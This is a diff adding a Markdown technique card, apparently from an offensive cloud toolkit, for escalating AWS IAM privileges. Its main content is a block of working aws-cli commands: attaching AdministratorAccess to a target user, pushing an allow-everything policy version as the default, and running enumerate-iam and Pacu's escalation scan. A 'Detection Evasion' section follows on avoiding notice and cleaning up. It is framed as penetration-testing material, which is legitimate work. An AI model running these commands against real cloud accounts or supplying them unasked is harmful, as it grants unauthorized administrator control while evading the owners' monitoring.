@@ -1,0 +1,53 @@
+---
+name: iam-privesc
+phase: cloud
+mitre_ids: [T1078.004, T1548]
+opsec_level: 3
+description: Escalate privileges in AWS by exploiting misconfigured IAM policies and role trust relationships
+module: phantom-cloud
+tools: [aws-cli, pacu, enumerate-iam]
+prerequisites: [aws_access_key, aws_secret_key]
+---
+# AWS IAM Privilege Escalation
+
+## Technique
+Identify and exploit misconfigured IAM policies that allow a low-privilege
+user to escalate to administrator-level access by attaching policies, creating
+new users, or assuming high-privilege roles.
+
+## Commands
+```bash
+# Enumerate current identity and permissions
+aws sts get-caller-identity
+aws iam get-user
+aws iam list-attached-user-policies --user-name TARGET_USER
+
+# Check for iam:AttachUserPolicy permission (direct escalation)
+aws iam attach-user-policy --user-name TARGET_USER \
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# Check for iam:CreatePolicyVersion (policy version escalation)
+aws iam create-policy-version --policy-arn POLICY_ARN \
+    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
+    --set-as-default
+
+# Automated enumeration with enumerate-iam
+python3 enumerate-iam.py --access-key AKID --secret-key SECRET
+
+# Pacu framework for automated escalation
+pacu --module iam__privesc_scan
+```
+
+## Usage
+1. Enumerate all IAM permissions for the current identity.
+2. Identify escalation paths (policy attachment, role assumption, etc.).
+3. Escalate to admin and document the misconfiguration for the report.
+
+## Detection Evasion
+- Avoid creating new IAM users — prefer role assumption.
+- Use existing permissions rather than modifying policies where possible.
+- Clean up any temporary policy versions after the engagement.
+
+## MITRE ATT&CK
+- T1078.004 — Valid Accounts: Cloud Accounts
+- T1548 — Abuse Elevation Control Mechanism
